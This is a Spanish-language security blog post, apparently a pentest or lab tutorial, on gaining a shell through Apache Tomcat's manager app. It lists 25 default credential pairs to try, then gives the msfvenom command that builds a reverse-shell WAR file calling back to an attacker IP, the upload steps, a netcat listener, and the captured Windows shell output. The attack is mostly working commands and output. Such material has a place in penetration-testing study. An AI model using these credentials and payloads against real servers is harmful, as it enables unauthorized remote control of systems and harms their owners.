---
date: 2022-10-29T00:20:05.000Z
layout: post
comments: true
title: Subir archivo malicioso en tomcat
subtitle: 'WAR file'
description: >-
image: >-
    http://imgfz.com/i/rbPl7wv.png
optimized_image: >-
    http://imgfz.com/i/rbPl7wv.png
category: ciberseguridad
tags: 
  - linux
  - hacking
  - exploit
  - vulnerabilidad
  - war
  - default
  - credentials
author: Felipe Canales Cayuqueo
paginate: true
---

Apache Tomcat es un servidor web de código abierto y contenedor de Servlet para código Java. En esta ocasión se subirá un archivo por medio del "manager app", en el cual muchas veces contiene alguna de las siguientes credenciales:

|Username     |Password  |
|-------------|----------|
|admin        |password  |
|admin        |<blank>   |
|admin        |Password1 |
|admin        |password1 |
|admin        |admin     |
|admin        |tomcat    |
|both         |tomcat    |
|manager      |manager   |
|role1        |role1     |
|role1        |tomcat    |
|role         |changethis|
|root         |Password1 |
|root         |changethis|
|root         |password  |
|root         |password1 |
|root         |r00t      |
|root         |root      |
|root         |toor      |
|tomcat       |tomcat    |
|tomcat       |s3cret    |
|tomcat       |password1 |
|tomcat       |password  |
|tomcat       |<blank>   |
|tomcat       |admin     |
|tomcat       |changethis|

Si ya obtuvimos acceso al "manager app", debemos crear nuestro payload por medio de ```msfvenom```:

```bash
┌──(root㉿kali)-[/tomcat]
└─ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.23 LPORT=443 -f war -o reverse.war                                       
Payload size: 1085 bytes
Final size of war file: 1085 bytes
Saved as: reverse.war
```

```bash
┌──(root㉿kali)-[/tomcat]
└─ ls
reverse.war
```

Ahora dentro del "manager app" nos dirigimos a la sección "archivo WAR a desplegar" y le damos en "Choose File":

![tomcat1](/images/tomcat.png)

Y seleccionamos el archivo ```reverse.war``` para desplegar:

![tomcat2](/images/tomcatwarupload.png)

Nos ponemos a la escucha con ```netcat``` en el puerto 443:

```bash
┌──(root㉿kali)-[/tomcat]
└─ nc -nlvp 443
listening on [any] 443 ...
```

Y abrimos ```/reverse``` en la tabla de aplicaciones de Tomcat:

![tomcat2](/images/tomcatreversewar.png)


Para finalmente obtener nuestra shell interactiva:

```bash
┌──(root㉿kali)-[/tomcat]
└─ nc -nlvp 443
listening on [any] 443 ...
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.11] 49811
Microsoft Windows [Version 10.0.17763.2114]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>
```
  
